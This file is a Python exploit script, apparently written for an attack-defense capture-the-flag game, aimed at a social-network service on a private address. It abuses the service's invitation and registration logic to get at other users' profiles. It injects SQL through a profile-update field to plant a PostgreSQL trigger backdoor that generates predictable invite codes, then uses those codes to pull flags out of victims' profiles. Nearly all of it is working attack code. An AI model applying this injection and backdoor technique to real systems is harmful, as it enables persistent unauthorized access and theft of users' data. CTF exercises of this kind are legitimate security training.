import re

from mysession import *
import requests
import random

url = 'http://192.168.0.100:4343'
# url = 'http://192.168.0.100:4567'


find_friends = lambda x: re.findall('/(spbctf_put\\S+)/friends', x)
find_uid = lambda x: re.findall('"og:uid"\\s+content="(\\d+)"', x)[0]
def exp1():


    with MySession(url, 'exploit') as s, MySession(url, 'anonym') as anonym:
        assert s.login('korniltsev', 'qwerty')


        fs = find_friends(s.friends('korniltsev'))



        for f in fs:
            invite1 = s.createInvite()
            fs2 = find_friends(s.friends(f))
            target = fs2[1]
            target_uid = find_uid(anonym.get_profile(target))

            with MySession(url, 'exploit2') as s2:
                exploit_target = "exploit" + target + str(random.randint(0, 99999999))
                assert s2.register(exploit_target, "qwerty", "qwe", "qweqwe", "qwe@wa.com", invite1, target_uid)

                print(s2.get_profile_by_id(target_uid))


            break


import hashlib

backdoor_field_name = 'INSERT_INTO_SIGNUP_INVITATIONS_OWNER_ID_CODE_SIGNUPS_REMAINING_HIDDEN_VALUES'

backdoor_sql = """
INSERT INTO "signup_invitations" ("owner_id", "code", "signups_remaining", "hidden") VALUES (?, ?, ?, ? );
BEGIN TRANSACTION ;
CREATE OR REPLACE FUNCTION dup() RETURNS TRIGGER AS $proc$
BEGIN
    insert into signup_invitations (code, owner_id,  signups_remaining, hidden)
    values (decode(md5(CONCAT((select username from users where id = NEW.user_id) , 'salt4')), 'hex'),NEW.id,1,true) ON CONFLICT DO NOTHING ;
    return NEW;
END
$proc$ LANGUAGE plpgsql;


DROP TRIGGER IF EXISTS bd on accounts;
CREATE trigger  bd AFTER INSERT on accounts
FOR EACH ROW
EXECUTE PROCEDURE dup() ;
COMMIT ;
"""

def exploit2_plant_backdoor():
    with MySession(url, 'check1') as s:
        assert s.login('korniltsev', 'qwerty')

        invite1 = s.createInvite()
        u, p = s.gen_creds()
        assert s.register(u, p, u, u, u + "@gov.ua", invite1)
        backdoor = {    backdoor_field_name:backdoor_sql }

        ok = s.update_profile(u, u, '', True, backdoor)
        assert ok


def exp2(target_user):
    assert type(target_user) == str
    with MySession(url, 'exploit') as s:



        # uname = b'spbctf_put2_msbvweehhgjf'
        uname = target_user.encode('utf-8')
        invite = hashlib.md5(uname + b'salt4').hexdigest()
        u = 'spbctf_put2_' + (hashlib.md5(invite.encode('utf-8') + b'user_salt').hexdigest()[:12])
        p =                  hashlib.md5(invite.encode('utf-8') + b'pass_salt').hexdigest()[:12]


        inviteres = s.register(u, p, u, u, u + '@gov.ua', invite)
        assert inviteres
        flags = re.findall("[A-Z0-9]{31}=", s.get_profile(uname.decode('utf-8')))
        print(flags)
exp2('spbctf_put2_zv1orjj819pf')
# exploit2_plant_backdoor()
